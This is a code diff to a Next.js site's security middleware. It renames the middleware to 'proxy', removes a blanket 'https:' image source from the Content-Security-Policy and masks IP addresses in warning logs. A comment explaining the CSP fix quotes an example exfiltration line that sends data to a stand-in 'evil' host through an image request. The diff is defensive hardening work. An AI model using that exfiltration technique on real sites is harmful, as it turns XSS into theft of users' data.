@@ -2,6 +2,7 @@ import { NextResponse, NextRequest } from "next/server";
 import { getToken } from "next-auth/jwt";
 import createMiddleware from "next-intl/middleware";
 import { routing } from "./i18n/routing";
+import { maskIp } from "./lib/security/escape";
 
 // next-intl locale routing (FR at "/", NL/EN prefixed). Applied only to the
 // localized site routes below (/api and /admin keep their own handling).
@@ -23,8 +24,14 @@ function buildCsp(nonce: string): string {
     "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
     // Fonts: Google Fonts + Perplexity AI + data URIs
     "font-src 'self' https://fonts.gstatic.com https://r2cdn.perplexity.ai data:",
-    // Images: self + HTTPS externe + data URIs + blob + Google Maps
-    "img-src 'self' https: data: blob: https://maps.googleapis.com https://maps.gstatic.com",
+    // Images: self + data/blob + Google Maps tiles.
+    // SECURITY: a blanket `https:` used to be allowed here, which turns any XSS
+    // into a working exfiltration channel (`new Image().src =
+    // 'https://evil/?'+data` needs no CORS and no user interaction). There is no
+    // functional need for it: next.config.ts sets `remotePatterns: []`, so
+    // next/image optimises no remote host.
+    // www.google.com / www.gstatic.com are needed for the reCAPTCHA badge assets.
+    "img-src 'self' data: blob: https://maps.googleapis.com https://maps.gstatic.com https://www.google.com https://www.gstatic.com",
     // Connexions: Vercel Analytics + Speed Insights + reCAPTCHA + Google Maps + Vercel Live
     "connect-src 'self' https://vitals.vercel-insights.com https://vercel-insights.com https://www.google.com https://www.gstatic.com https://maps.googleapis.com https://maps.gstatic.com https://*.googleapis.com https://vercel.live wss://ws-us3.pusher.com https://sockjs-us3.pusher.com",
     // Fermeture sécurité object/frame
@@ -89,16 +96,22 @@ const SUSPICIOUS_PATHS = [
 ];
 
 /**
- * Security Middleware
- * Runs on every request to add security headers and block malicious traffic
- * Also handles authentication for admin routes
+ * Security proxy (formerly `middleware`).
+ *
+ * Runs on every request to add security headers and block malicious traffic,
+ * and handles authentication for admin routes.
+ *
+ * Next.js 16 deprecated the `middleware` file convention in favour of `proxy`:
+ * the file is now src/proxy.ts and the export is `proxy`. Behaviour, the
+ * `config.matcher` below and the request/response API are all unchanged — only
+ * the two names moved.
  */
-export async function middleware(request: NextRequest) {
+export async function proxy(request: NextRequest) {
   const { pathname } = request.nextUrl;
   const userAgent = request.headers.get("user-agent") || "";
 
   // Per-request CSP nonce. Generated once up front so every response this
-  // middleware returns (including the early "blocked" ones below) carries a
+  // proxy returns (including the early "blocked" ones below) carries a
   // consistent Content-Security-Policy (next.config.ts no longer sets one).
   const nonce = btoa(crypto.randomUUID());
   const csp = buildCsp(nonce);
@@ -109,10 +122,13 @@ export async function middleware(request: NextRequest) {
   );
 
   if (isSuspiciousAgent) {
+    // PRIVACY (GDPR): mask the IP and cap the UA. console.warn survives the
+    // production `removeConsole` setting, so a raw IP here is PII written
+    // straight into the Vercel logs.
     console.warn("Blocked suspicious user agent:", {
-      userAgent,
+      userAgent: userAgent.substring(0, 100),
       path: pathname,
-      ip: request.headers.get("x-forwarded-for") || "unknown",
+      ip: maskIp(request.headers.get("x-forwarded-for")),
     });
     const response = new NextResponse("Forbidden", { status: 403 });
     response.headers.set("Content-Security-Policy", csp);
@@ -127,7 +143,7 @@ export async function middleware(request: NextRequest) {
   if (isSuspiciousPath) {
     console.warn("Blocked suspicious path:", {
       path: pathname,
-      ip: request.headers.get("x-forwarded-for") || "unknown",
+      ip: maskIp(request.headers.get("x-forwarded-for")),
       userAgent: userAgent.substring(0, 100), // Limit logged UA length
     });
     const response = new NextResponse("Not Found", { status: 404 });
@@ -148,7 +164,7 @@ export async function middleware(request: NextRequest) {
     console.warn("Blocked suspicious query:", {
       query: queryString.substring(0, 200),
       path: pathname,
-      ip: request.headers.get("x-forwarded-for") || "unknown",
+      ip: maskIp(request.headers.get("x-forwarded-for")),
     });
     const response = new NextResponse("Bad Request", { status: 400 });
     response.headers.set("Content-Security-Policy", csp);
@@ -258,7 +274,7 @@ export async function middleware(request: NextRequest) {
   return response;
 }
 
-// Configure which routes the middleware runs on
+// Configure which routes the proxy runs on
 export const config = {
   matcher: [
     /*
